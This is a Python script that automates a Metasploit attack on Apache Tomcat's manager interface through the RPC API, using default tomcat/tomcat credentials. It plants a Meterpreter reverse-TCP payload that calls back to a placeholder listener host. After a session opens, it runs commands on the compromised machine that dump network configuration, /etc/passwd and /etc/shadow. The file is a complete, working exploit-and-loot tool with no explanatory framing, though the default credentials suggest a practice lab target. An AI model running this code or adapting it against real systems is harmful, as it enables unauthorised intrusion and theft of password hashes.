import asyncio
import logging
from pymetasploit3.msfrpc import MsfRpcClient
import time  

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def exploit_tomcat_mgr(target_ip):
    try:
        logger.info("Connecting to Metasploit RPC...")
        client = MsfRpcClient(password='mypass', server='172.17.0.1', port=55553, ssl=False)

        logger.info("Using tomcat_mgr_upload exploit...")
        exploit = client.modules.use('exploit', 'multi/http/tomcat_mgr_upload')
        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = 8180
        exploit['HttpUsername'] = 'tomcat'
        exploit['HttpPassword'] = 'tomcat'

        payload = client.modules.use('payload', 'java/meterpreter/reverse_tcp')
        payload['LHOST'] = 'YOUR_LHOST'
        payload['LPORT'] = 4444

        logger.info("Launching exploit...")
        result = exploit.execute(payload=payload)
        logger.info(f"Exploit launched with job ID: {result}")

        logger.info("Waiting for a session...")
        session = None
        session_id = None
        for attempt in range(20):
            sessions = client.sessions.list
            logger.info(f"Checking for sessions (attempt {attempt + 1}/20)... Found {len(sessions)} session(s)")
            if sessions:
                session_id = list(sessions.keys())[0]
                session = client.sessions.session(session_id)
                logger.info(f"Session {session_id} established")
                break
            await asyncio.sleep(2)

        if not session:
            logger.warning("No session was established.")
            return "Exploit failed or no session created."

        # Function to run command on meterpreter
        def meterpreter_exec(cmd):
            session.write(cmd + '\n')
            time.sleep(1)  
            return session.read()

        # Execute commands
        ipconfig = meterpreter_exec('ip a')
        logger.info(f"[+] ipconfig:\n{ipconfig}")


        passwd = meterpreter_exec('cat /etc/passwd')
        logger.info(f"[+] /etc/passwd content:\n{passwd}")

        shadow = meterpreter_exec('cat /etc/shadow')
        logger.info(f"[+] /etc/shadow content:\n{shadow}")

        return {
            'session_id': session_id,
            'ipconfig': ipconfig,
            'passwd': passwd,
            'shadow': shadow
        }

    except Exception as e:
        logger.error(f"Error occurred: {e}")
        return f"Exception: {e}"
